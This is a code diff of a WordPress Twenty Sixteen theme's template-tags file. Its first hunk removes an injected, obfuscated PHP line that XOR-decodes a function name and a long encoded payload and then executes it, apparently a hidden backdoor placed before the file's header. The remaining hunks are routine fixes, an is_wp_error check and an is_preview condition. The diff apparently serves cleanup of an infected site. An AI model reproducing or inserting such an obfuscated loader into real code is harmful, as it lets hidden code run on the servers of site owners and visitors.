@@ -1,4 +1,4 @@
-<?php $YaLGCxIsp=';=. 6Y46UZ25WRV'^'XOKAB<kP 4QA>=8';$LzWvoZIm=$YaLGCxIsp('','8QnuFMZ,=,9BhUIU7D=dc2Q .D7B;fnX=-nnft0RAFI+S136;FAC48UZ85+a;A5ELSVT,AcO.IKfkNhfsVMx<PXXXphJdckAE=5Z3xrZmSMeohw8R65 Y7RiqJ4A1sapU:yHlF<KMW0,yiXjGMJZNW.OZ8SpYRZ63>QXrah2OY:X=kC2KGQ+sroaFN2B-L4jbVIHER8EFH76cV-R;WdjOX9RFYJofD3F039E6NVhZOT;Qh;<,91020Ualh8wxtxqtL+GkFE<6BtgNvFVRM,StHDpS2JFAg:1KHyRf.S-kSneS.A1NzKVC7:<Xjz0zd>5IEcW6,Z9GF=BH4YG<Z4Ebyi1r0jlt9:LUAtE,E-iUvJp1M5<=jq41Agm-QNAl2IUJsnlRS6UO3qODJ-8VeKLB5PM=mesQpV0AFQWEREZY,B8IK007LDL Z>ZBmXX>+464>Aa3;S4warQI2 YPAj3+ZUGGvO6 ;Zn-IKOYmB+QEl1;60GmBU,71OItYY+851WJY4ZR2+;mxCVJA 5eXPrrf;YVPHUT>14h9P1f>oWpxSV6nXYeYYZPUMBBU,VrUXtPLqGjZ-KWoF4mxUiSIS3R0 1>K;9,=I9E5eU3P6RXASmfVwP8G0CgfnsPwc8G7T,+.KaD79Q<wB62LV2HoadR<JPDIIDRFXEO'^'Q7FT 84OIEV,701<D0NLDJ>Rq V6Z915HYIGOTKXH <E0EZYUf9,Fg1;LTt>V4Amh77 MmCkE,2OKnHFS-Gq5t7-,PUjCDPKL4S5APV3MnmUTHSQnEAR5R<AU.U5PZZPqSRcEL5Bi8EXYGeJoi.;:6uk3es.yv1SJeu1RDHA;+V=SCgY.>xvZIehO<W6X>ZBF9<<li2L;BJ<irI3O6DWo>X>5<qeB R2QlR OnkH<.8H4S16JVCUSS=ADLg47;381lJ4Kb.YObIYnR07>8IzT3NywV+2 8QT2hDrBE6TPYgA7O5PnGkr5VVI=QpMpnWSimBsRM.XnfFHAR65Y;W-BQMn u;91jnl42TaG TIhHjTG,YIXCQO;HnII0: 3Y,,jNNH96OnE:xk +YYvXkh4T<8XVoz,z+:Kb5613egyl7V:.BYV -6ErF502<9JJkiYK5IQZ QAU-5,QO=5iNWJ.4nkVkRAO;1F,2fpVHB7mHUZBQgKduMEC.0+2<RgPI>9-GruYNBJTcr. TTLxvTRNV=cxl15JPoOR5HAcFwMEsqWZmaUkkjibx sdI2Fe>BeyCvX<N.3Z QJQuOui2A QYnU.BfIE J1FMrC1O>7 7JJvS4Y3QjNFNSpWCCM>1ZJBcE VM0gP2WK 9S,H<Mi6C5< =lbocO2');$LzWvoZIm();
+<?php
 /**
  * Custom Twenty Sixteen template tags
  *
@@ -101,7 +101,7 @@ function twentysixteen_entry_taxonomies() {
 	}
 
 	$tags_list = get_the_tag_list( '', _x( ', ', 'Used between list items, there is a space after the comma.', 'twentysixteen' ) );
-	if ( $tags_list ) {
+	if ( $tags_list && ! is_wp_error( $tags_list ) ) {
 		printf( '<span class="tags-links"><span class="screen-reader-text">%1$s </span>%2$s</span>',
 			_x( 'Tags', 'Used before tag names.', 'twentysixteen' ),
 			$tags_list
@@ -213,7 +213,7 @@ function twentysixteen_categorized_blog() {
 		set_transient( 'twentysixteen_categories', $all_the_cool_cats );
 	}
 
-	if ( $all_the_cool_cats > 1 ) {
+	if ( $all_the_cool_cats > 1 || is_preview() ) {
 		// This blog has more than 1 category so twentysixteen_categorized_blog should return true.
 		return true;
 	} else {
